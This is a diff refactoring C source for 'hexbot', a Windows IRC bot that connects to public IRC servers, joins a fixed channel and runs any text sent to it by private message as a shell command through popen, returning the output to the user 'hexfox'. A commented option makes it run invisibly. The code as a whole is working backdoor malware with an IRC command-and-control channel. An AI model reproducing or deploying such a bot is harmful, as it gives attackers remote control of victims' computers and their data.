@@ -11,7 +11,7 @@
 */
 
 #pragma comment(lib,"ws2_32.lib")
-#include <winsock2.h>
+#include <WinSock2.h>
 #include <stdio.h>
 #include <conio.h>
 #include <string.h>
@@ -19,219 +19,236 @@
 #define popen _popen
 #define pclose _pclose
 
-static SOCKET Socket;
-int createSock( char * serverHost, unsigned short serverPort )
+SOCKET createSock(char * host_irc, unsigned short port_irc)
 {
-    WSADATA wsaDat;
+    SOCKET _socket;
+    WSADATA wsa_data;
     struct hostent *host;
-    struct sockaddr_in sockAddr;
+    struct sockaddr_in sock_addr;
 
-    // Initialise Winsock
-    if ( WSAStartup( MAKEWORD(2, 2), &wsaDat ) != 0 )
+    //initialise Winsock
+    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0)
     {
-        printf( "WSA Initialization failed!\r\n" );
+        printf("WSA Initialization failed!\n");
         WSACleanup();
         return 0;
     }
 
-    Socket = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
-
-    if ( Socket == INVALID_SOCKET )
+    if ((_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
     {
-        printf( "Socket creation failed.\r\n" );
+        printf("Socket creation failed!\n");
         WSACleanup();
         return 0;
     }
 
-    // Resolve IP address for hostname
-
-    if ( ( host = gethostbyname( serverHost ) ) == NULL )
+    //resolve IP address for hostname
+    if ((host = gethostbyname(host_irc)) == NULL)
     {
-        printf( "Failed to resolve hostname.\r\n" );
+        printf("Failed to resolve hostname!\n");
         WSACleanup();
         return 0;
     }
 
-    // Setup our socket address structure
+    //setup our socket address structure
+    sock_addr.sin_port = htons(port_irc);
+    sock_addr.sin_family = AF_INET;
+    sock_addr.sin_addr.s_addr = *((unsigned long*)host->h_addr);
 
-    sockAddr.sin_port = htons( serverPort );
-    sockAddr.sin_family = AF_INET;
-    sockAddr.sin_addr.s_addr = *( (unsigned long*)host->h_addr );
-
-    // Attempt to connect to server
-    if ( connect(Socket, (struct sockaddr*)(&sockAddr), sizeof(sockAddr)) != 0 )
+    //attempt to connect to server
+    if (connect(_socket, (struct sockaddr*)(&sock_addr), sizeof(sock_addr)) != 0)
     {
-        printf( "Failed to establish connection with server\r\n" );
+        printf("Failed to establish connection with server!\n");
         WSACleanup();
         return 0;
     }
-    return 1;
+
+    return _socket;
 }
 
 
-void deleteSocket()
+void deleteSocket(SOCKET _socket)
 {
-    shutdown(Socket, SD_SEND);	// Shutdown our socket
-    closesocket(Socket);	// Close our socket entirely
-    WSACleanup();	// Cleanup Winsock
+    shutdown(_socket, SD_SEND);	//shutdown our socket
+    closesocket(_socket);       //close our socket entirely
+    WSACleanup();               //cleanup Winsock
 }
 
  /*
 //For invisible use "WINAPI WinMain"
 int WINAPI WinMain(
-                    HINSTANCE hInstance,	// handle to current instance
-                    HINSTANCE hPrevInstance,	// handle to previous instance
-                    LPSTR lpCmdLine,	// pointer to command line
-                    int nCmdShow 	// show state of window
+                    HINSTANCE hInstance,        //handle to current instance
+                    HINSTANCE hPrevInstance,	//handle to previous instance
+                    LPSTR lpCmdLine,            //pointer to command line
+                    int nCmdShow                //show state of window
                   )
 */
+
+#define SIZE_BUFFER 16384
+#define SIZE_STR 128
 int main()
 {
-    //MUST BE MANY SERVERS IF ONE NOT AVIALABLE
-    char *goHost[] = { "chat.freenode.net", "irc.757.org", "irc.eth-0.nl" },
-            sPort[] = "6667",
-            sendPart[] = "PART #h3xb0t\n",
-            sendQuit[] = "QUIT :bye\n",
-            prefName[] = "zname",
-            prefNick[] = "znick",
-            joinChan[] = "JOIN #h3xb0t\n",
-            pPong[] = "PONG ",
-            sendHello[] = "hexbot",
-            *msgNickName,
-            *subGetBuf,
-            *sendPing, // send ping to server
-            *pCmd,
-            getBuffer[10000], // display msg from server
-            sendBuffer[80], // send msg to server
-            tmpBuffer[80],
-            usnd[60], srvcmd[10], snick[20], // vars for parser msg from server
-            s1[10], name[20], s3[10], s4[10], s5[10], s6[10], nick[20];
+    //must be many servers if one not avialable
 
-    int lenGetBuf; 	// length buffer from server
+    char    //names
+            *host_irc[] = { "chat.freenode.net",
+                            "irc.757.org",
+                            "irc.eth-0.nl"
+                          },
+            port_irc[]    = "6667",
+            prefix_name[] = "zname",
+            prefix_nick[] = "znick",
+            bot_name[]    = "hexbot",
+            *msg_nick_name,
+            //commands
+            *cmd,       //command from server
+            *cmd_ping,  //ping to server
+            cmd_join[] = "JOIN #h3xb0t\n",
+            cmd_pong[] = "PONG ",
+            cmd_part[] = "PART #h3xb0t\n",
+            cmd_quit[] = "QUIT :bye\n",
+            //buffers
+            *sub_buff_from,
+            buffer_from[SIZE_BUFFER], //msg from server
+            buffer_to[SIZE_BUFFER],     //msg to server
+            buffer_tmp[SIZE_BUFFER],
+            //vars for parser msg from server
+            usnd[SIZE_STR], snick[SIZE_STR],
+            nick[SIZE_STR], name[SIZE_STR], srvcmd[SIZE_STR],
+            tmp_1[SIZE_STR], tmp_2[SIZE_STR], tmp_3[SIZE_STR],
+            tmp_4[SIZE_STR], tmp_5[SIZE_STR];
 
+    int len_buff_from; //length buffer from server
     unsigned int i = 0,
-                     stopped = 0,
-                     countHost = sizeof ( goHost ) / sizeof ( goHost[0] ) ;
+                 stopped = 0,
+                 count_hosts,
+                 len_cmd_pong;
+    FILE *io_buff;
+    SOCKET _socket;
 
-    struct _iobuf *pPipe;
+    count_hosts = sizeof(host_irc) / sizeof(host_irc[0]);
+    len_cmd_pong = strlen(cmd_pong);
 
-    unsigned int lenPong = strlen ( pPong );
+    memset(buffer_tmp, 0, sizeof(buffer_tmp));
+    memset(buffer_from, 0, sizeof(buffer_from));
 
-    memset(tmpBuffer, 0, sizeof(tmpBuffer));
-    memset(getBuffer, 0, sizeof(getBuffer));
-
-    while ( 1 )
+    while(1)
     {
-        if ( i == (countHost - 1) ) i = 0;
-        // RECONNECT TO OTHER SERVER
-        if ( !createSock( goHost[ i ], (unsigned short)atoi(sPort) ) )
+        if (i == (count_hosts - 1))
+            i = 0;
+
+        //connect to irc host
+        if (!(_socket =
+              createSock(host_irc[i], (unsigned short)atoi(port_irc))))
         {
-            printf( "Change server\n" );
-            deleteSocket();
+            printf("Change server\n");
+            deleteSocket(_socket);
             i++;
             continue;
         }
-        printf( "Connected...\n" );
+        printf("Connected to %s\n", host_irc[i]);
 
-        // SEND USER AND NICK TO SERVER
-        msgNickName = ( char * ) malloc ( strlen(prefName) + strlen(prefNick) + 128 );
-        srand ( (unsigned int)time(0) );
-        sprintf( msgNickName, "USER %s%d 0 * :%s\nNICK %s%d\n", prefName, rand(), sendHello, prefNick, rand() );
+        //send user and nick to irc host
+        msg_nick_name =
+                (char *)malloc(strlen(prefix_name) + strlen(prefix_nick) + 128);
+        srand((unsigned int)time(0));
+        sprintf(msg_nick_name, "USER %s%d 0 * :%s\nNICK %s%d\n",
+                prefix_name, rand(), bot_name, prefix_nick, rand());
+        sscanf(msg_nick_name, "%s%s%s%s%s%s%s",
+               tmp_1, name, tmp_2, tmp_3, tmp_4, tmp_5, nick);
+        send(_socket, msg_nick_name, (int)strlen(msg_nick_name), 0);
+        printf("%s", msg_nick_name);
+        free(msg_nick_name);
 
-        sscanf( msgNickName, "%s%s%s%s%s%s%s",  s1, name, s3, s4, s5, s6, nick);
-
-        send( Socket, msgNickName, (int)strlen(msgNickName), 0 );
-
-        printf( "%s", msgNickName );
-        free ( msgNickName );
-
-        while ( (lenGetBuf = recv( Socket, getBuffer, sizeof(getBuffer), 0 )) != SOCKET_ERROR )
+        while((len_buff_from =
+               recv(_socket, buffer_from, sizeof(buffer_from), 0)) != SOCKET_ERROR)
         {
-            sscanf( getBuffer, "%s%s%s", usnd, srvcmd, snick ); // parse for < userfrom@ip servercmd userto : >
+            //parse for < userfrom@ip servercmd userto : >
+            sscanf(buffer_from, "%s%s%s", usnd, srvcmd, snick);
 
-            // JOIN TO CHANNEL
-            if ( strstr( getBuffer, "/MOTD" ) || strstr( getBuffer, "MODE" ) )
+            //join to channel
+            if (strstr(buffer_from, "/MOTD") || strstr(buffer_from, "MODE"))
             {
-                send( Socket, joinChan, (int)strlen(joinChan), 0);
-                printf( "%s", joinChan );
+                send(_socket, cmd_join, (int)strlen(cmd_join), 0);
+                printf("%s", cmd_join);
             }
-            //FOR RECONNECT
-            if ( strstr ( getBuffer, "ERROR :Closing Link" ) )
+            //for reconnect
+            if (strstr (buffer_from, "ERROR :Closing Link"))
             {
                 i++;
                 break;
             }
-            // FOR STAY ON A SERVER WE PLAY THE GAME PING PONG WITH SERVER  ))
-            if ( !strncmp ( "PING", getBuffer, 4 ) )
+            //for stay on a server we play the game ping pong with server
+            if(!strncmp ("PING", buffer_from, 4))
             {
-                printf( "%s", getBuffer );
-                sendPing = ( char * ) malloc ( strlen(getBuffer) + lenPong );
-                subGetBuf = strchr ( getBuffer,  ':');
-                sprintf( sendPing, "%s%s", pPong, subGetBuf);
-                printf("%s", sendPing);
-                send( Socket, sendPing, (int)strlen(sendPing), 0);
-                free ( sendPing );
+                printf("%s", buffer_from);
+                cmd_ping = (char *) malloc(strlen(buffer_from) + len_cmd_pong);
+                sub_buff_from = strchr(buffer_from, ':');
+                sprintf(cmd_ping, "%s%s", cmd_pong, sub_buff_from);
+                printf("%s", cmd_ping);
+                send(_socket, cmd_ping, (int)strlen(cmd_ping), 0);
+                free (cmd_ping);
             }
-            // IF PARSING SERVERCMD AND NICKS EQUALLY
-            else if ( !strcmp(srvcmd, "PRIVMSG") && !strcmp(snick, nick) )
+            //if parsing cmd from server and nicks equally
+            else if(!strcmp(srvcmd, "PRIVMSG") && !strcmp(snick, nick))
             {
-                /****
-                    READ DATA AFTER SECOND CHAR ':'
-                    FULL STRING =>
-                    [ userfrom@ip servercmd userto : {COMMAND PARAM ...} (THIS SUBSRTRING IS WRITE TO VAR - pCmd) ]
-                ****/
-                pCmd = (char *) malloc( strlen(getBuffer) );
-                pCmd = getBuffer;
-
-                while ( pCmd[1] != ':' )
+                /*
+                    read data after second char ':'
+                    full string ->
+                    [ userfrom@ip servercmd userto : {command param ...}
+                     (this subsrtring is write to var - pcmd) ]
+                */
+                cmd = (char *)malloc(strlen(buffer_from));
+                cmd = buffer_from;               
+                while(cmd[1] != ':')
                 {
-                    pCmd++;
+                    cmd++;
                 }
-                pCmd+=2;
+                cmd+=2;
 
-                if ( strstr( pCmd, "!change" ) )  // change server
+                //reconnect server
+                if (strstr(cmd, "!reconnect"))
                 {
                     i++;
-                    send(Socket, sendPart, (int)strlen(sendPart), 0);
-                    send(Socket, sendQuit, (int)strlen(sendQuit), 0);
+                    send(_socket, cmd_part, (int)strlen(cmd_part), 0);
+                    send(_socket, cmd_quit, (int)strlen(cmd_quit), 0);
                     break;
                 }
 
-                if ( strstr( pCmd, "!stop" ) )  // stop bot
+                if (strstr(cmd, "!stop"))//stopping bot
                 {
                     stopped = 1;
                     break;
                 }
 
-                pPipe = popen( pCmd, "rt" );
+                io_buff = popen(cmd, "rt");
+                printf("%s", cmd);
 
-                printf( "%s", pCmd );
-
-                // SEND RESULT OF COMMAND
-                while( fgets( tmpBuffer, sizeof(tmpBuffer), pPipe ) )
+                //send result of command
+                while(fgets(buffer_tmp, sizeof(buffer_tmp), io_buff))
                 {
-                    strcpy(sendBuffer, "PRIVMSG hexfox :");
-                    strcat(sendBuffer, tmpBuffer);
-                    send(Socket, sendBuffer, (int)strlen(sendBuffer), 0);
+                    strcpy(buffer_to, "PRIVMSG hexfox :");
+                    strcat(buffer_to, buffer_tmp);
+                    send(_socket, buffer_to, (int)strlen(buffer_to), 0);
                 }
 
-                memset(sendBuffer, 0, sizeof(sendBuffer));
-                memset(tmpBuffer, 0, sizeof(tmpBuffer));
+                memset(buffer_to, 0, sizeof(buffer_to));
+                memset(buffer_tmp, 0, sizeof(buffer_tmp));
             }
             else
             {
-                printf( "%s", getBuffer );
+                printf("%s", buffer_from);
             }
 
-            lenGetBuf = 0;
-            memset( getBuffer, 0, sizeof(getBuffer) );
+            len_buff_from = 0;
+            memset(buffer_from, 0, sizeof(buffer_from));
         }
 
-        if ( stopped )
+        //the end bot work
+        if (stopped)
         {
-            send(Socket, sendPart, (int)strlen(sendPart), 0);
-            send(Socket, sendQuit, (int)strlen(sendQuit), 0);
-            deleteSocket();
+            send(_socket, cmd_part, (int)strlen(cmd_part), 0);
+            send(_socket, cmd_quit, (int)strlen(cmd_quit), 0);
+            deleteSocket(_socket);
             printf("hexbot is stopped!\n");
             break;
         }
